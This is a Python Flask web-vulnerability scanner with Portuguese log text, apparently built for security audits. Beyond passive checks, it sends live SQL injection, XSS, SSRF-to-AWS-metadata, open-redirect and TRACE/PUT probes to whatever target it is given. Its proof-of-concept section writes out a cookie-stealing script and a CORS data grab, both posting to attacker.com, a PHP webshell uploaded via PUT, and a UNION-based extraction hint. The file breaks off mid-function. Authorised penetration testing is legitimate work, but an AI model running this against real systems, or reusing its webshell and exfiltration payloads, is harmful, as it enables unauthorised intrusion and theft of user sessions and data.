import os,socket,ssl,re,threading,urllib.parse,datetime,subprocess,json,shutil,base64
from concurrent.futures import ThreadPoolExecutor,as_completed
import requests
requests.packages.urllib3.disable_warnings()
import dns.resolver
import whois as whoislib
from flask import Flask,render_template_string,request
from flask_socketio import SocketIO,emit

app=Flask(__name__)
app.config['SECRET_KEY']='soc2024'
sio=SocketIO(app,async_mode='threading',cors_allowed_origins='*',logger=False,engineio_logger=False)

GOBIN=os.path.expanduser('~/go/bin')
NUCLEI=os.path.join(GOBIN,'nuclei')
KATANA=os.path.join(GOBIN,'katana')
SUBFINDER=os.path.join(GOBIN,'subfinder')

DANGEROUS_PORTS={21:'FTP',23:'Telnet',25:'SMTP',445:'SMB',1433:'MSSQL',3306:'MySQL',3389:'RDP',5432:'PostgreSQL',5900:'VNC',6379:'Redis',9200:'Elasticsearch',27017:'MongoDB',11211:'Memcached'}
COMMON_PORTS=[21,22,23,25,53,80,110,143,443,445,993,995,1433,3306,3389,5432,5900,6379,8080,8443,8888,9200,27017,11211,4443,8000,8081,9000,9001]
SECURITY_HEADERS=[('Content-Security-Policy','XSS'),('Strict-Transport-Security','HSTS'),('X-Frame-Options','Clickjacking'),('X-Content-Type-Options','MIME Sniffing'),('Referrer-Policy','Info Leak'),('Permissions-Policy','Feature Abuse'),('Cross-Origin-Opener-Policy','Spectre'),('Cross-Origin-Embedder-Policy','Spectre')]
LEAK_HEADERS=['Server','X-Powered-By','Via','X-Generator','X-Runtime','X-AspNet-Version','X-Drupal-Cache']
SENSITIVE_PATHS=[
    '/.env','/.env.local','/.env.production','/.git/config','/.git/HEAD',
    '/admin/','/phpmyadmin/','/adminer/','/adminer.php','/backup/',
    '/dump.sql','/backup.zip','/api/v1/users','/api/users','/swagger.json',
    '/swagger-ui.html','/openapi.json','/graphql','/graphiql',
    '/actuator/','/actuator/env','/actuator/health','/actuator/mappings',
    '/phpinfo.php','/robots.txt','/.htaccess','/wp-config.php',
    '/config.php','/web.config','/composer.json','/package.json',
    '/Dockerfile','/docker-compose.yml','/.DS_Store','/server-status',
    '/debug/','/console/','/shell/','/manager/html',
    '/solr/admin/','/jenkins/','/kibana/',
]
SCANNER_UAS=[
    ('sqlmap','sqlmap/1.7'),('nikto','Nikto/2.1.6'),
    ('nmap','Nmap Scripting Engine'),('burpsuite','BurpSuite/2023'),
    ('nuclei','Nuclei - projectdiscovery'),('acunetix','acunetix-wvs'),
    ('dirbuster','DirBuster-1.0'),('gobuster','gobuster/3.6'),
    ('wfuzz','Wfuzz/3.1'),('masscan','masscan/1.3'),
]

def find_port():
    for p in [7331,7332,7333,8765,9001]:
        with socket.socket() as s:
            s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            if s.connect_ex(('127.0.0.1',p))!=0: return p
    return 7331

def run_cmd(cmd,timeout=300):
    try:
        r=subprocess.run(cmd,capture_output=True,text=True,timeout=timeout,env={**os.environ,'PATH':os.environ.get('PATH','')+':'+GOBIN})
        return r.stdout.strip()
    except subprocess.TimeoutExpired: return 'TIMEOUT'
    except Exception as e: return 'ERROR:'+str(e)

class Scanner:
    def __init__(self,target,sid):
        self.target=target.strip(); self.sid=sid; self.results={}
        self.sess=requests.Session(); self.sess.verify=False; self.sess.timeout=9
        self.sess.headers['User-Agent']='Mozilla/5.0 Chrome/124.0'
    def emit(self,ev,d): sio.emit(ev,d,room=self.sid)
    def log(self,m,l='info'): self.emit('log',{'msg':m,'level':l})
    def get(self,url,t=7):
        try: return self.sess.get(url,allow_redirects=True,timeout=t,verify=False)
        except: return None
    def parse(self):
        t=self.target
        if not t.startswith('http'): t='https://'+t
        p=urllib.parse.urlparse(t)
        self.host=p.hostname; self.base=p.scheme+'://'+p.netloc
        try: self.ip=socket.gethostbyname(self.host)
        except: self.ip=self.host
        self.log('Alvo: '+self.host+' | IP: '+self.ip,'section')
    def dns(self):
        self.log('A verificar DNS...','section'); d={}
        for rt in ['A','AAAA','MX','NS','TXT']:
            try:
                ans=dns.resolver.resolve(self.host,rt,lifetime=5)
                d[rt]=[str(r) for r in ans]; self.log('DNS '+rt+': '+', '.join(d[rt][:2]),'ok')
            except: pass
        try: dns.resolver.resolve(self.host,'DNSKEY',lifetime=5); d['dnssec']=True; self.log('DNSSEC activo','ok')
        except: d['dnssec']=False; self.log('DNSSEC inactivo','med')
        spf=any('v=spf1' in r.lower() for r in d.get('TXT',[])); d['SPF']=spf
        self.log('SPF: '+('ok' if spf else 'AUSENTE!'),'ok' if spf else 'high')
        try:
            da=dns.resolver.resolve('_dmarc.'+self.host,'TXT',lifetime=5)
            dm=any('v=dmarc1' in str(r).lower() for r in da)
        except: dm=False
        d['DMARC']=dm; self.log('DMARC: '+('ok' if dm else 'AUSENTE!'),'ok' if dm else 'high')
        d['zone_transfer']=False
        try:
            import dns.zone,dns.query
            ns=d.get('NS',[])
            if ns:
                z=dns.zone.from_xfr(dns.query.xfr(ns[0].rstrip('.'),self.host,timeout=4))
                if z: self.log('ZONE TRANSFER possivel!','crit'); d['zone_transfer']=True
        except: self.log('Zone Transfer bloqueado','ok')
        try:
            w=whoislib.whois(self.host)
            d['whois']={'registrar':str(getattr(w,'registrar','N/A')),'expiration_date':str(getattr(w,'expiration_date','N/A'))}
            exp=getattr(w,'expiration_date',None)
            if exp:
                if isinstance(exp,list): exp=exp[0]
                if isinstance(exp,datetime.datetime):
                    days=(exp-datetime.datetime.utcnow()).days
                    self.log('Dominio expira em '+str(days)+' dias','crit' if days<14 else 'high' if days<30 else 'ok')
        except: d['whois']={'error':'N/A'}
        self.results['dns']=d
    def ports(self):
        self.log('A escanear portas...','section'); op=[]
        def chk(p):
            s=socket.socket(); s.settimeout(1.2); r=s.connect_ex((self.ip,p)); s.close(); return p if r==0 else None
        with ThreadPoolExecutor(max_workers=60) as ex:
            for f in as_completed({ex.submit(chk,p):p for p in COMMON_PORTS}):
                p=f.result()
                if p:
                    op.append(p); d=DANGEROUS_PORTS.get(p,'')
                    self.log('Porta '+str(p)+(' PERIGO: '+d if d else ' aberta'),'crit' if d else 'ok')
        if not any(p in DANGEROUS_PORTS for p in op): self.log('Sem portas perigosas','ok')
        self.results['ports']={'open':sorted(op)}
    def tls(self):
        self.log('A verificar TLS...','section'); tls={}
        try:
            ctx=ssl.create_default_context()
            with ctx.wrap_socket(socket.create_connection((self.host,443),timeout=8),server_hostname=self.host) as s:
                cert=s.getpeercert(); proto=s.version(); ciph=s.cipher()
            tls.update({'protocol':proto,'cipher':ciph[0] if ciph else 'N/A','bits':ciph[2] if ciph else 0})
            exp=cert.get('notAfter','')
            if exp:
                e=datetime.datetime.strptime(exp,'%b %d %H:%M:%S %Y %Z')
                days=(e-datetime.datetime.utcnow()).days; tls['cert_days_left']=days
                self.log('Cert expira em '+str(days)+' dias','crit' if days<7 else 'high' if days<30 else 'ok')
            tls['san']=[v for t,v in cert.get('subjectAltName',[]) if t=='DNS']
            self.log('Protocolo: '+proto,'ok' if proto in ('TLSv1.2','TLSv1.3') else 'crit')
        except Exception as e: tls['error']=str(e); self.log('TLS: '+str(e)[:50],'warn')
        try:
            r=requests.get('http://'+self.host,allow_redirects=False,timeout=5,verify=False)
            loc=r.headers.get('Location','')
            if r.status_code in (301,302,307,308) and loc.startswith('https'): self.log('Redirect HTTP->HTTPS ok','ok')
            else: self.log('HTTP sem redirect HTTPS','high')
        except: pass
        self.results['tls']=tls
    def headers(self):
        self.log('A verificar security headers...','section')
        r=self.get(self.base)
        if not r: self.log('Servidor nao responde','crit'); return
        hdrs={k.lower():v for k,v in r.headers.items()}
        missing,present,leaked=[],[],[]
        for h,risk in SECURITY_HEADERS:
            if h.lower() in hdrs: present.append({'header':h,'value':hdrs[h.lower()]}); self.log(h+': presente','ok')
            else: missing.append({'header':h,'risk':risk}); self.log(h+': AUSENTE - '+risk,'crit' if h in ('Content-Security-Policy','Strict-Transport-Security') else 'high')
        for lk in LEAK_HEADERS:
            if lk.lower() in hdrs: leaked.append({'header':lk,'value':hdrs[lk.lower()]}); self.log('Vazado: '+lk+'='+hdrs[lk.lower()],'high')
        issues=[]
        for c in r.cookies:
            f=[]
            if not c.secure: f.append('sem Secure')
            if not c.has_nonstandard_attr('HttpOnly'): f.append('sem HttpOnly')
            if f: self.log('Cookie '+c.name+': '+' | '.join(f),'high'); issues.append({'name':c.name,'issues':f})
        self.results['cookies']=issues
        self.results['headers']={'missing':missing,'present':present,'leaked':leaked,'status_code':r.status_code}
    def paths(self):
        self.log('A verificar paths sensiveis...','section'); exposed=[]
        def chk(path):
            try:
                r=self.sess.get(self.base+path,allow_redirects=False,timeout=6,verify=False)
                if r.status_code in (200,301,302,403): return {'path':path,'status':r.status_code,'size':len(r.content),'severity':'crit' if r.status_code==200 else 'med'}
            except: pass
            return None
        with ThreadPoolExecutor(max_workers=15) as ex:
            for f in as_completed({ex.submit(chk,p):p for p in SENSITIVE_PATHS}):
                res=f.result()
                if res: exposed.append(res); self.log(res['path']+' -> '+str(res['status']),'crit' if res['severity']=='crit' else 'med')
        exposed.sort(key=lambda x:0 if x['severity']=='crit' else 1)
        if not exposed: self.log('Sem paths expostos','ok')
        self.results['paths']=exposed
    def ua_block(self):
        self.log('A testar bloqueio de scanners...','section'); nb=[]; bl=[]
        for name,ua in SCANNER_UAS:
            try:
                r=requests.get(self.base,headers={'User-Agent':ua},verify=False,timeout=6)
                if r.status_code in (403,429,444,503): bl.append({'name':name,'code':r.status_code}); self.log(name+' bloqueado','ok')
                else: nb.append({'name':name,'code':r.status_code}); self.log(name+' NAO bloqueado -> '+str(r.status_code),'high')
            except requests.exceptions.ConnectionError: bl.append({'name':name,'code':0}); self.log(name+' recusado','ok')
            except: pass
        pct=int(len(bl)/len(SCANNER_UAS)*100)
        self.log(str(len(bl))+'/'+str(len(SCANNER_UAS))+' bloqueados ('+str(pct)+'%)','ok' if pct==100 else 'high')
        self.results['ua_blocking']={'not_blocked':nb,'blocked':bl,'total':len(SCANNER_UAS)}
    def rate_limit(self):
        self.log('A testar rate limiting...','section'); results={}
        for path,label in [('/login','Login'),('/api/login','API Login'),('/auth','Auth')]:
            url=self.base+path; codes=[]
            for i in range(20):
                try:
                    r=requests.post(url,json={'username':'test','password':'test'},verify=False,timeout=4)
                    codes.append(r.status_code)
                    if r.status_code in (429,403): break
                except: break
            if not codes: continue
            lim=any(c in (429,403) for c in codes)
            self.log(label+': '+('ok' if lim else 'SEM rate limit! '+str(len(codes))+' pedidos'),'ok' if lim else 'crit')
            results[label]={'codes':codes,'limited':lim}
        self.results['rate_limit']=results
    def cors(self):
        self.log('A verificar CORS...','section'); cors={}
        for origin,desc in [('https://evil.com','externo'),('null','null'),('http://localhost','localhost')]:
            try:
                r=self.sess.options(self.base,headers={'Origin':origin,'Access-Control-Request-Method':'GET'},timeout=6,verify=False)
                acao=r.headers.get('Access-Control-Allow-Origin',''); acac=r.headers.get('Access-Control-Allow-Credentials','')
                if acao=='*': self.log('CORS wildcard CRITICO!','crit')
                elif acao==origin: self.log('CORS reflecte '+origin,'high')
                else: self.log('CORS '+origin+': bloqueado','ok')
                cors[origin]={'acao':acao,'acac':acac,'desc':desc}
            except: pass
        self.results['cors']=cors
    def methods(self):
        self.log('A verificar metodos HTTP...','section'); found=[]
        try:
            r=self.sess.options(self.base,timeout=6,verify=False)
            for m,d in [('PUT','Upload'),('DELETE','Eliminacao'),('TRACE','XST'),('CONNECT','Proxy')]:
                if m in r.headers.get('Allow',''): found.append({'method':m,'risk':d}); self.log(m+' exposto','high')
            if not found: self.log('Metodos perigosos nao expostos','ok')
        except: pass
        try:
            r=requests.request('TRACE',self.base,verify=False,timeout=4)
            if r.status_code==200: self.log('TRACE activo!','crit'); found.append({'method':'TRACE','risk':'XST'})
            else: self.log('TRACE bloqueado','ok')
        except: self.log('TRACE bloqueado','ok')
        self.results['methods']={'dangerous_allowed':found}
    def fingerprint(self):
        self.log('A verificar fingerprinting...','section'); fp={}
        r=self.get(self.base+'/robots.txt')
        fp['robots_txt']=r.text[:300] if r and r.status_code==200 else None
        self.log('robots.txt: '+('ok' if fp['robots_txt'] else 'ausente'),'ok' if fp['robots_txt'] else 'med')
        fp['security_txt']=False
        for path in ['/.well-known/security.txt','/security.txt']:
            r2=self.get(self.base+path)
            if r2 and r2.status_code==200: fp['security_txt']=True; self.log('security.txt ok','ok'); break
        r3=self.get(self.base+'/nao-existe-soc-test')
        fp['tech_leaked']=[]
        if r3:
            for tech in ['nginx','apache','werkzeug','flask','django','php','java','express','iis','tomcat']:
                if tech in r3.text.lower(): fp['tech_leaked'].append(tech)
            if fp['tech_leaked']: self.log('Stack exposta: '+', '.join(fp['tech_leaked']),'high')
            else: self.log('Erro 404 nao revela stack','ok')
        git=self.get(self.base+'/.git/config')
        fp['git_exposed']=bool(git and git.status_code==200 and '[core]' in git.text)
        self.log('.git EXPOSTO!' if fp['git_exposed'] else '.git protegido','crit' if fp['git_exposed'] else 'ok')
        env=self.get(self.base+'/.env')
        fp['env_exposed']=bool(env and env.status_code==200 and '=' in env.text)
        self.log('.env EXPOSTO!' if fp['env_exposed'] else '.env protegido','crit' if fp['env_exposed'] else 'ok')
        r4=self.get(self.base)
        if r4:
            xfo=r4.headers.get('X-Frame-Options',''); csp=r4.headers.get('Content-Security-Policy','')
            fp['clickjacking']=not xfo and 'frame-ancestors' not in csp
            self.log('Clickjacking possivel!' if fp['clickjacking'] else 'Clickjacking protegido','high' if fp['clickjacking'] else 'ok')
        else: fp['clickjacking']=False
        self.results['fingerprint']=fp
    def waf(self):
        self.log('A verificar WAF...','section')
        waf={}; waf_det=False; waf_prod='Desconhecido'
        sigs=['cloudflare','sucuri','akamai','incapsula','modsecurity','imperva','aws waf','barracuda','fortiweb']
        for label,payload in [('SQLi',"?id=1'--"),('XSS','?q=<script>alert(1)</script>'),('LFI','?file=../../../etc/passwd'),('SSTI','?name={{7*7}}')]:
            try:
                r=requests.get(self.base+payload,verify=False,timeout=6,headers={'User-Agent':self.sess.headers['User-Agent']})
                for sig in sigs:
                    if sig in r.text.lower() or sig in str(r.headers).lower(): waf_det=True; waf_prod=sig.capitalize()
                if r.status_code in (403,406,429,503): waf_det=True
                bl=r.status_code in (403,406,429,503)
                waf[label]={'status':r.status_code,'blocked':bl}
                self.log(label+': '+('bloqueado' if bl else 'NAO bloqueado'),'ok' if bl else 'high')
            except: pass
        self.log('WAF: '+waf_prod if waf_det else 'SEM WAF detectado','ok' if waf_det else 'high')
        waf['waf_detected']=waf_det; waf['waf_product']=waf_prod
        self.results['injection']=waf
    def scan_subdomains(self):
        self.log('A descobrir subdominios...','section'); subs=[]
        if os.path.exists(SUBFINDER):
            out=run_cmd([SUBFINDER,'-d',self.host,'-silent','-timeout','30'],timeout=60)
            if out and out not in ('TIMEOUT',''): subs=list(set(out.split('\n')))
            self.log('Subfinder: '+str(len(subs))+' subdominios','ok' if subs else 'med')
        else:
            common=['www','mail','remote','blog','webmail','server','ns1','ns2','smtp','secure','vpn','m','shop','ftp','admin','api','dev','staging','test','portal','app','cdn','static','media']
            for sub in common:
                try: full=sub+'.'+self.host; socket.gethostbyname(full); subs.append(full); self.log('Subdominio: '+full,'ok')
                except: pass
        live_subs=[]
        for sub in subs[:20]:
            try:
                r=requests.get('https://'+sub,verify=False,timeout=5,headers={'User-Agent':'Mozilla/5.0'})
                title=re.search(r'<title>(.*?)</title>',r.text,re.I)
                live_subs.append({'subdomain':sub,'status':r.status_code,'title':title.group(1)[:50] if title else ''})
                self.log('Vivo: '+sub+' -> '+str(r.status_code),'ok')
            except: pass
        self.results['subdomains']={'found':len(subs),'live':live_subs}
    def scan_katana(self):
        self.log('A fazer crawling...','section'); urls=[]
        if os.path.exists(KATANA):
            self.log('Katana a crawlar (aguarda)...','info')
            out=run_cmd([KATANA,'-u',self.base,'-d','3','-jc','-silent','-timeout','30','-c','10'],timeout=120)
            if out and out!='TIMEOUT': urls=[l.strip() for l in out.split('\n') if l.strip()]
        else:
            try:
                r=self.get(self.base)
                if r:
                    found=re.findall(r'href=["\']([^"\']+)["\']',r.text)
                    for u in found[:50]:
                        if u.startswith('http'): urls.append(u)
                        elif u.startswith('/'): urls.append(self.base+u)
            except: pass
        self.log('Crawl: '+str(len(urls))+' URLs encontradas','ok')
        params_found=[]
        interesting=['id','user','file','path','url','redirect','token','key','api','admin','debug','cmd','exec','query','search','page','lang','template','include','load','dir']
        for u in urls:
            parsed=urllib.parse.urlparse(u)
            qs=urllib.parse.parse_qs(parsed.query)
            for param in qs:
                if param.lower() in interesting:
                    params_found.append({'url':u,'param':param})
        if params_found: self.log('Parametros interessantes: '+str(len(params_found)),'high')
        self.results['katana']={'urls_found':len(urls),'urls':urls[:50],'interesting_params':params_found[:20]}
    def scan_nuclei(self):
        self.log('A correr Nuclei CVE scanner...','section')
        self.log('Pode demorar 5-10 min. Aguarda...','warn')
        findings=[]
        if os.path.exists(NUCLEI):
            out=run_cmd([NUCLEI,'-u',self.base,'-severity','critical,high,medium','-tags','cve,exposure,misconfig,default-login,sqli,xss,ssrf,lfi,rce,xxe,idor','-silent','-json','-timeout','10','-c','25','-rate-limit','50','-o','/tmp/nuclei_out.json'],timeout=600)
            try:
                with open('/tmp/nuclei_out.json') as f:
                    for line in f:
                        line=line.strip()
                        if not line: continue
                        try:
                            d=json.loads(line)
                            sev=d.get('info',{}).get('severity','info')
                            name=d.get('info',{}).get('name','')
                            matched=d.get('matched-at','')
                            desc=d.get('info',{}).get('description','')
                            cve_ids=d.get('info',{}).get('classification',{}).get('cve-id',[])
                            findings.append({'name':name,'severity':sev,'matched':matched,'description':desc[:200],'cve':cve_ids,'template':d.get('template-id','')})
                            self.log('['+sev.upper()+'] '+name+(' | '+', '.join(cve_ids) if cve_ids else ''),'crit' if sev=='critical' else 'high' if sev=='high' else 'med')
                        except: pass
            except: pass
        if not findings: findings=self._manual_cve_checks()
        crit=[f for f in findings if f.get('severity') in ('critical','crit')]
        high=[f for f in findings if f.get('severity')=='high']
        self.log('Nuclei: '+str(len(crit))+' criticos, '+str(len(high))+' altos, '+str(len(findings))+' total','crit' if crit else 'high' if high else 'ok')
        self.results['nuclei']={'findings':findings,'total':len(findings),'critical':len(crit),'high':len(high)}
    def _manual_cve_checks(self):
        self.log('A fazer checks manuais de CVEs...','section'); findings=[]
        checks=[
            ('/actuator/env','GET','spring','Spring Actuator Exposto','high',['CVE-2022-22965']),
            ('/admin/','GET','admin','Admin Panel Exposto','high',[]),
            ('/wp-admin/','GET','wordpress','WordPress Admin','high',[]),
            ('/manager/html','GET','tomcat','Tomcat Manager','high',[]),
            ('/phpmyadmin/','GET','phpmyadmin','phpMyAdmin Exposto','high',[]),
            ('/api/v1/','GET','api','API v1 Exposta','medium',[]),
            ('/graphql','POST','data','GraphQL Exposto','medium',[]),
            ('/?redirect=https://evil.com','GET','evil.com','Open Redirect','medium',[]),
        ]
        for path,method,indicator,name,sev,cves in checks:
            try:
                if method=='GET': r=self.get(self.base+path)
                else: r=self.sess.post(self.base+path,json={'query':'{__typename}'},timeout=5)
                if r and r.status_code in (200,301,302):
                    if not indicator or indicator.lower() in r.text.lower():
                        findings.append({'name':name,'severity':sev,'matched':self.base+path,'description':name,'cve':cves,'template':'manual'})
                        self.log('['+sev.upper()+'] '+name+(' | '+', '.join(cves) if cves else ''),'crit' if sev=='critical' else 'high' if sev=='high' else 'med')
            except: pass
        # SQLi
        sqli_errors=['sql syntax','mysql_fetch','ora-01756','sqlite_','postgresql','unclosed quotation','you have an error in your sql']
        for path in ['/?id=','/?page=','/?cat=','/?user=','/?product=']:
            for payload in ["'","' OR '1'='1","1 AND 1=2"]:
                try:
                    r=self.get(self.base+path+urllib.parse.quote(payload))
                    if r:
                        for err in sqli_errors:
                            if err in r.text.lower():
                                findings.append({'name':'SQL Injection Detectado','severity':'critical','matched':self.base+path,'description':'SQL error: '+err,'cve':['CWE-89'],'template':'manual'})
                                self.log('[CRITICAL] SQL Injection em '+path,'crit'); break
                except: pass
        # XSS
        xss_payload='<script>alert(1)</script>'
        for path in ['/?q=','/?search=','/?s=','/?name=','/?keyword=']:
            try:
                r=self.get(self.base+path+urllib.parse.quote(xss_payload))
                if r and xss_payload in r.text:
                    findings.append({'name':'XSS Reflectido','severity':'high','matched':self.base+path,'description':'Payload reflectido sem sanitizacao','cve':['CWE-79'],'template':'manual'})
                    self.log('[HIGH] XSS Reflectido em '+path,'high')
            except: pass
        # SSRF
        for path in ['/?url=','/?redirect=','/?link=','/?src=','/?next=']:
            try:
                r=self.get(self.base+path+'http://169.254.169.254/latest/meta-data/',timeout=4)
                if r and ('ami-id' in r.text or 'instance-id' in r.text):
                    findings.append({'name':'SSRF - AWS Metadata','severity':'critical','matched':self.base+path,'description':'SSRF permite acesso ao metadata AWS','cve':['CWE-918'],'template':'manual'})
                    self.log('[CRITICAL] SSRF AWS Metadata!','crit')
            except: pass
        return findings

    # ══════════════════════════════════════════════
    # POC ENGINE — Provas de Conceito REAIS
    # ══════════════════════════════════════════════
    def run_poc(self):
        self.log('A executar Provas de Conceito (PoC)...','section')
        pocs={}

        # PoC 1: Clickjacking
        self.log('PoC: Clickjacking...','info')
        try:
            r=self.get(self.base)
            if r:
                xfo=r.headers.get('X-Frame-Options',''); csp=r.headers.get('Content-Security-Policy','')
                if not xfo and 'frame-ancestors' not in csp:
                    pocs['clickjacking']={'success':True,'output':'Site pode ser embebido em iframe!\nX-Frame-Options: AUSENTE\nAtacante pode sobrepor botoes invisiveis.','proofs':[{'impact':'Acoes involuntarias — roubo de cliques','curl_poc':'curl -I '+self.base+' | grep -i x-frame','js_poc':'// PoC real — iframe sobre a pagina\ndocument.write(\'<style>body{margin:0}</style><iframe src="'+self.base+'" style="width:100vw;height:100vh;border:none;position:fixed;top:0;left:0"></iframe><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(255,0,0,0.8);color:white;padding:20px;font-size:20px;z-index:9999">CLICKJACKING POC</div>\')'}]}
                else: pocs['clickjacking']={'success':False,'output':'Protegido: X-Frame-Options='+xfo,'proofs':[]}
        except Exception as e: pocs['clickjacking']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 2: CORS
        self.log('PoC: CORS...','info')
        try:
            cors_results=[]
            for origin in ['https://evil.com','null','http://localhost','https://evil.'+self.host]:
                try:
                    r=self.sess.options(self.base,headers={'Origin':origin,'Access-Control-Request-Method':'GET','Access-Control-Request-Headers':'Authorization'},timeout=6,verify=False)
                    acao=r.headers.get('Access-Control-Allow-Origin',''); acac=r.headers.get('Access-Control-Allow-Credentials','')
                    if acao=='*' or acao==origin:
                        cors_results.append({'origin_sent':origin,'acao':acao,'credentials':acac,'impact':'Roubo de dados autenticados cross-origin','curl_poc':'curl -H "Origin: '+origin+'" -H "Access-Control-Request-Method: GET" -X OPTIONS '+self.base+' -I','js_poc':'// PoC real — roubo de dados via CORS\nfetch("'+self.base+'/api/user",{\n  credentials: "include",\n  headers: {"Origin": "'+origin+'"}\n}).then(r=>r.json()).then(data=>{\n  // Dados roubados:\n  console.log(data);\n  fetch("https://attacker.com/steal?d="+JSON.stringify(data));\n}).catch(e=>console.log("Sem endpoint API, mas CORS aceita origem"));\n\n// Resultado real do teste:\n// Access-Control-Allow-Origin: '+acao+'\n// Access-Control-Allow-Credentials: '+acac})
                except: pass
            if cors_results:
                pocs['cors']={'success':True,'output':str(len(cors_results))+' origens arbitrarias aceites!','proofs':cors_results}
            else:
                pocs['cors']={'success':False,'output':'CORS correctamente configurado.','proofs':[]}
        except Exception as e: pocs['cors']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 3: Open Redirect
        self.log('PoC: Open Redirect...','info')
        try:
            found_redirects=[]
            for param in ['?next=','?redirect=','?url=','?return=','?goto=','?returnUrl=','?continue=','?r=','?redir=','?destination=']:
                for payload in ['https://evil.com','//evil.com','https://evil.com%2F@'+self.host]:
                    try:
                        r=self.sess.get(self.base+param+payload,allow_redirects=False,timeout=5,verify=False)
                        loc=r.headers.get('Location','')
                        if r.status_code in (301,302,307,308) and ('evil.com' in loc or loc.startswith('//')):
                            found_redirects.append({'payload':param+payload,'redirect_to':loc,'status':r.status_code,'poc_url':self.base+param+payload,'impact':'Phishing — utilizador redirecionado para site malicioso\nAtacante envia: '+self.base+param+'https://evil.com'})
                    except: pass
            if found_redirects:
                pocs['open_redirect']={'success':True,'output':str(len(found_redirects))+' Open Redirects confirmados!','proofs':found_redirects}
            else:
                pocs['open_redirect']={'success':False,'output':'Sem Open Redirects detectados.','proofs':[]}
        except Exception as e: pocs['open_redirect']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 4: XSS Reflectido — teste REAL
        self.log('PoC: XSS Reflectido...','info')
        try:
            xss_found=[]
            payloads=[
                '<script>alert("XSS-SOC-'+self.host[:10]+'")</script>',
                '<img src=x onerror=alert("XSS")>',
                '"><svg onload=alert(1)>',
                "';alert('XSS')//",
                '<iframe src=javascript:alert("XSS")>',
            ]
            params=['q','search','s','query','name','input','text','keyword','id','page','lang','msg','error','info','data','value','term','field']
            for param in params:
                for payload in payloads[:3]:
                    try:
                        url=self.base+'?'+param+'='+urllib.parse.quote(payload)
                        r=self.get(url)
                        if r and payload in r.text:
                            xss_found.append({'param':param,'payload':payload,'poc_url':url,'impact':'Execucao de JavaScript no browser da vitima\nAtacante pode roubar cookies, sessoes, redirecionar','js_poc':'// PoC de roubo de cookie via XSS\n<script>\nvar img=new Image();\nimg.src="https://attacker.com/steal?cookie="+encodeURIComponent(document.cookie)+"&url="+encodeURIComponent(location.href);\ndocument.body.appendChild(img);\n</script>\n\n// URL de teste:\n'+url})
                    except: pass
                if xss_found: break
            if xss_found:
                pocs['xss_reflected']={'success':True,'output':'XSS confirmado no parametro "'+xss_found[0]['param']+'"!','proofs':xss_found}
            else:
                pocs['xss_reflected']={'success':False,'output':'Sem XSS reflectido detectado nos parametros testados.','proofs':[]}
        except Exception as e: pocs['xss_reflected']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 5: SQL Injection — teste REAL
        self.log('PoC: SQL Injection...','info')
        try:
            sqli_found=[]
            sqli_payloads=["'","''","` OR 1=1--","' OR '1'='1","1 AND 1=2","' AND '1'='2","1' ORDER BY 1--","1 UNION SELECT NULL--"]
            sqli_errors=['sql syntax','mysql_fetch','ora-01756','sqlite_','postgresql error','unclosed quotation','you have an error in your sql','warning: mysql','supplied argument is not a valid mysql']
            time_payloads=["1; WAITFOR DELAY '0:0:5'--","1 AND SLEEP(5)--","1' AND SLEEP(5)--"]
            for path in ['/?id=','/?page=','/?cat=','/?user=','/?product=','/?item=','/?p=','/?article=']:
                for payload in sqli_payloads:
                    try:
                        url=self.base+path+urllib.parse.quote(payload)
                        r=self.get(url)
                        if r:
                            for err in sqli_errors:
                                if err in r.text.lower():
                                    sqli_found.append({'path':path,'payload':payload,'error_found':err,'poc_url':url,'impact':'Acesso a base de dados — extração de dados, bypass de autenticacao','curl_poc':'curl "'+url+'"','js_poc':'// SQLi confirmado — exemplo de exfiltracao:\n// URL: '+url+'\n// Erro encontrado: '+err+'\n\n// Para extrair dados usar:\n// '+self.base+path+"' UNION SELECT table_name,NULL FROM information_schema.tables--"})
                                    break
                    except: pass
                if sqli_found: break
            # Time-based blind SQLi
            if not sqli_found:
                for path in ['/?id=','/?page=']:
                    for payload in time_payloads[:2]:
                        try:
                            import time
                            start=time.time()
                            r=self.get(self.base+path+urllib.parse.quote(payload))
                            elapsed=time.time()-start
                            if elapsed>=4.5:
                                sqli_found.append({'path':path,'payload':payload,'error_found':'Time-based ('+str(round(elapsed,1))+'s delay)','poc_url':self.base+path+urllib.parse.quote(payload),'impact':'Blind SQL Injection — base de dados vulneravel','curl_poc':'time curl "'+self.base+path+urllib.parse.quote(payload)+'"'})
                        except: pass
            if sqli_found:
                pocs['sql_injection']={'success':True,'output':'SQL Injection CONFIRMADO em "'+sqli_found[0]['path']+'"!','proofs':sqli_found}
            else:
                pocs['sql_injection']={'success':False,'output':'Sem SQL Injection obvio detectado.','proofs':[]}
        except Exception as e: pocs['sql_injection']={'success':False,'output':'Erro: '+str(e),'proofs':[]}

        # PoC 6: HTTP Methods perigosos
        self.log('PoC: HTTP Methods...','info')
        try:
            methods_found=[]
            try:
                r=requests.request('TRACE',self.base,verify=False,timeout=5,headers={'User-Agent':'Mozilla/5.0'})
                if r.status_code==200:
                    methods_found.append({'method':'TRACE','status':r.status_code,'response_preview':r.text[:200],'impact':'XST — Cross-Site Tracing, pode revelar cookies HttpOnly e headers de autenticacao','curl_poc':'curl -X TRACE '+self.base+' -v','js_poc':'// XST PoC\nfetch("'+self.base+'",{method:"TRACE",credentials:"include"})\n.then(r=>r.text()).then(t=>console.log("Headers vazados:",t))'})
            except: pass
            try:
                r=requests.request('PUT',self.base+'/poc-test-soc.txt',data='SOC-SCANNER-POC-TEST',verify=False,timeout=5)
                if r.status_code in (200,201,204):
                    methods_found.append({'method':'PUT','status':r.status_code,'impact':'Upload arbitrario de ficheiros — possivel webshell','curl_poc':'curl -X PUT '+self.base+'/shell.php -d "<?php system($_GET[cmd]); ?>"','js_poc':'// Upload de webshell via PUT\nfetch("'+self.base+'/shell.php",{\n  method:"PUT",\n  body:"<?php system($_GET[cmd]); ?>"\n})'})
            except: pass
            try:
                r=self.sess.options(self.base,timeout=6,verify=False)
                allow=r.headers.get('Allow','')
                for m in ['DELETE','CONNECT','PATCH']:
                    if m in allow:
                        methods_found.append({'method':m,'status':200,'impact':'Metodo '+m+' disponivel — risco de '+('eliminacao de recursos' if m=='DELETE' else 'proxy tunneling' if m=='CONNECT' else 'modificacao de recursos'),'curl_poc':'curl -X '+m+' '+self.base+'/recurso-alvo -v'})
            except: pass
